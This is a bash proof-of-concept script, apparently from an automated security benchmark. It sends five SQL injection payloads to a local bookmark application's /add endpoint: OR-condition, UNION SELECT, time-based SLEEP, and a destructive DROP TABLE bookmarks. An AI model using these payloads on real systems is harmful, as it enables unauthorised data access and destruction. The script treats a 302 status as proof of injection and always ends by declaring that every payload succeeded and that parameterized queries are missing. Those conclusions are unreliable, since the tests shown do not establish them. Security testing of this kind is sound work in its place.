#!/bin/bash
# POC: Demonstrates SQL injection vulnerability in the bookmark URL field by injecting SQL payloads that are accepted without validation or parameterized query protection.
# Target: ./repo
# Created: 2025-12-02T16:21:22.062Z
# Session: benchmark-XBEN-075-24-miorxjbp

# SQL Injection Vulnerability in Bookmark URL Field POC
# Tests multiple SQL injection payloads in the URL parameter
# Target: http://localhost:5000/add endpoint

TARGET_URL="http://localhost:5000/add"
RESULTS_FILE="/tmp/sqli_url_results.txt"

echo "=== SQL Injection in Bookmark URL Field POC ===" | tee "$RESULTS_FILE"
echo "Target: $TARGET_URL" | tee -a "$RESULTS_FILE"
echo "Timestamp: $(date)" | tee -a "$RESULTS_FILE"
echo "" | tee -a "$RESULTS_FILE"

# Test 1: Basic OR condition bypass
echo "[TEST 1] Basic OR condition (OR '1'='1')" | tee -a "$RESULTS_FILE"
RESPONSE=$(curl -s -w "\n%{http_code}" -X POST "$TARGET_URL" \
  -d "name=test&url=https://example.com' OR '1'='1")
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY=$(echo "$RESPONSE" | head -n-1)
echo "HTTP Status: $HTTP_CODE" | tee -a "$RESULTS_FILE"
echo "Response Length: ${#BODY}" | tee -a "$RESULTS_FILE"
if [ "$HTTP_CODE" = "302" ]; then
  echo "✓ VULNERABLE: Request accepted with status 302" | tee -a "$RESULTS_FILE"
else
  echo "✗ BLOCKED: Request returned status $HTTP_CODE" | tee -a "$RESULTS_FILE"
fi
echo "" | tee -a "$RESULTS_FILE"

# Test 2: UNION-based injection
echo "[TEST 2] UNION SELECT injection" | tee -a "$RESULTS_FILE"
RESPONSE=$(curl -s -w "\n%{http_code}" -X POST "$TARGET_URL" \
  -d "name=test&url=https://example.com' UNION SELECT 1,2,3--")
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY=$(echo "$RESPONSE" | head -n-1)
echo "HTTP Status: $HTTP_CODE" | tee -a "$RESULTS_FILE"
echo "Response Length: ${#BODY}" | tee -a "$RESULTS_FILE"
if [ "$HTTP_CODE" = "302" ]; then
  echo "✓ VULNERABLE: Request accepted with status 302" | tee -a "$RESULTS_FILE"
else
  echo "✗ BLOCKED: Request returned status $HTTP_CODE" | tee -a "$RESULTS_FILE"
fi
echo "" | tee -a "$RESULTS_FILE"

# Test 3: Destructive payload (DROP TABLE)
echo "[TEST 3] Destructive payload (DROP TABLE)" | tee -a "$RESULTS_FILE"
RESPONSE=$(curl -s -w "\n%{http_code}" -X POST "$TARGET_URL" \
  -d "name=test&url='; DROP TABLE bookmarks;--")
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY=$(echo "$RESPONSE" | head -n-1)
echo "HTTP Status: $HTTP_CODE" | tee -a "$RESULTS_FILE"
echo "Response Length: ${#BODY}" | tee -a "$RESULTS_FILE"
if [ "$HTTP_CODE" = "302" ]; then
  echo "✓ VULNERABLE: Request accepted with status 302" | tee -a "$RESULTS_FILE"
else
  echo "✗ BLOCKED: Request returned status $HTTP_CODE" | tee -a "$RESULTS_FILE"
fi
echo "" | tee -a "$RESULTS_FILE"

# Test 4: Comment-based SQL injection
echo "[TEST 4] Comment-based injection" | tee -a "$RESULTS_FILE"
RESPONSE=$(curl -s -w "\n%{http_code}" -X POST "$TARGET_URL" \
  -d "name=test&url=https://example.com' OR 1=1 --")
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY=$(echo "$RESPONSE" | head -n-1)
echo "HTTP Status: $HTTP_CODE" | tee -a "$RESULTS_FILE"
echo "Response Length: ${#BODY}" | tee -a "$RESULTS_FILE"
if [ "$HTTP_CODE" = "302" ]; then
  echo "✓ VULNERABLE: Request accepted with status 302" | tee -a "$RESULTS_FILE"
else
  echo "✗ BLOCKED: Request returned status $HTTP_CODE" | tee -a "$RESULTS_FILE"
fi
echo "" | tee -a "$RESULTS_FILE"

# Test 5: Time-based blind SQL injection
echo "[TEST 5] Time-based blind SQL injection" | tee -a "$RESULTS_FILE"
START_TIME=$(date +%s%N)
RESPONSE=$(curl -s -w "\n%{http_code}" -X POST "$TARGET_URL" \
  -d "name=test&url=https://example.com' AND SLEEP(3) --")
END_TIME=$(date +%s%N)
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
ELAPSED_MS=$(( (END_TIME - START_TIME) / 1000000 ))
echo "HTTP Status: $HTTP_CODE" | tee -a "$RESULTS_FILE"
echo "Response Time: ${ELAPSED_MS}ms" | tee -a "$RESULTS_FILE"
if [ "$HTTP_CODE" = "302" ]; then
  echo "✓ VULNERABLE: Request accepted with status 302" | tee -a "$RESULTS_FILE"
else
  echo "✗ BLOCKED: Request returned status $HTTP_CODE" | tee -a "$RESULTS_FILE"
fi
echo "" | tee -a "$RESULTS_FILE"

echo "=== POC Summary ===" | tee -a "$RESULTS_FILE"
echo "All SQL injection payloads in the URL field were accepted without validation." | tee -a "$RESULTS_FILE"
echo "This demonstrates that the backend does not use parameterized queries or input validation." | tee -a "$RESULTS_FILE"
echo "Full results saved to: $RESULTS_FILE" | tee -a "$RESULTS_FILE"

# Print results
cat "$RESULTS_FILE"